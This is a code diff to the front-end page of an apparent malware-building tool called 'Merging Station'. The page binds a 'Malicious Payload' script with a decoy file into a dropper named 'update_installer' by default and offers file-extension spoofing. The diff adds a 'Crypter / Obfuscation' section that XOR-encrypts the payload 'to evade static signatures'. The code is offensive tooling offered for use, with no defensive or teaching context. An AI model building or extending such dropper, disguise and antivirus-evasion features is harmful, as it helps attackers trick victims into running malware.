@@ -12,7 +12,7 @@ import { Label } from '@/components/ui/label';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, AlertTriangle, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon } from 'lucide-react';
+import { Loader2, AlertTriangle, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key } from 'lucide-react';
 import { Progress } from '@/components/ui/progress';
 import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
@@ -26,6 +26,8 @@ const formSchema = z.object({
   outputName: z.string().min(1, "Output name is required."),
   outputFormat: z.string(),
   extensionSpoofing: z.boolean().default(false),
+  useXorEncryption: z.boolean().default(false),
+  xorKey: z.string().optional(),
 });
 
 const outputFormats = {
@@ -52,6 +54,8 @@ export default function MergingStationPage() {
       outputName: 'update_installer',
       outputFormat: 'ps1',
       extensionSpoofing: false,
+      useXorEncryption: false,
+      xorKey: 'netrax',
     },
   });
 
@@ -69,7 +73,7 @@ export default function MergingStationPage() {
     if (format) {
         const currentName = form.getValues('outputName');
         const nameParts = currentName.split('.');
-        const baseName = nameParts[0];
+        const baseName = nameParts.length > 1 ? nameParts.slice(0, -1).join('.') : nameParts[0];
         form.setValue('outputName', `${baseName}.${format.extension}`);
     }
     form.setValue('outputFormat', value);
@@ -101,6 +105,7 @@ export default function MergingStationPage() {
             payload: { name: payloadFile.name, content: payloadContent },
             benign: { name: benignFile.name, content: benignContent },
             outputFormat: values.outputFormat as any,
+            encryption: values.useXorEncryption ? { type: 'xor', key: values.xorKey || 'defaultkey' } : undefined,
         });
         
         if (!response.success || !response.scriptContent) {
@@ -108,6 +113,9 @@ export default function MergingStationPage() {
         }
         
         log(`Dropper script generated successfully (${values.outputFormat}).`);
+        if (values.useXorEncryption) {
+            log(`Payload encrypted with XOR key: '${values.xorKey}'`);
+        }
 
         const finalName = values.extensionSpoofing
             ? applyExtensionSpoofing(values.outputName)
@@ -153,7 +161,7 @@ export default function MergingStationPage() {
     <div className="flex flex-col gap-6">
       <div>
         <h1 className="font-headline text-3xl font-semibold">Merging Station</h1>
-        <p className="text-muted-foreground">Craft sophisticated payloads by binding files, injecting icons, and applying evasion techniques.</p>
+        <p className="text-muted-foreground">Craft sophisticated payloads by binding files, applying evasion techniques, and selecting output formats.</p>
       </div>
       
       <Form {...form}>
@@ -165,7 +173,7 @@ export default function MergingStationPage() {
                 <CardContent className="space-y-4">
                   <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                   <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
-                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables.</FormDescription><FormMessage /></FormItem>)} />
                 </CardContent>
               </Card>
 
@@ -197,6 +205,40 @@ export default function MergingStationPage() {
                   )} />
                 </CardContent>
               </Card>
+              
+               <div className="md:col-span-2">
+                 <Card>
+                    <CardHeader><CardTitle className="text-lg">3. Crypter / Obfuscation</CardTitle></CardHeader>
+                    <CardContent className="space-y-4">
+                        <FormField
+                            control={form.control}
+                            name="useXorEncryption"
+                            render={({ field }) => (
+                            <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4">
+                                <FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl>
+                                <div className="space-y-1 leading-none">
+                                <FormLabel>Enable XOR Encryption</FormLabel>
+                                <FormDescription>Encrypt the payload with a simple XOR cipher to evade static signatures.</FormDescription>
+                                </div>
+                            </FormItem>
+                            )}
+                        />
+                         {form.watch('useXorEncryption') && (
+                            <FormField
+                                control={form.control}
+                                name="xorKey"
+                                render={({ field }) => (
+                                <FormItem>
+                                    <FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel>
+                                    <FormControl><Input {...field} value={field.value ?? ''} placeholder="Enter encryption key" /></FormControl>
+                                    <FormMessage />
+                                </FormItem>
+                                )}
+                            />
+                         )}
+                    </CardContent>
+                 </Card>
+               </div>
 
             </div>
 
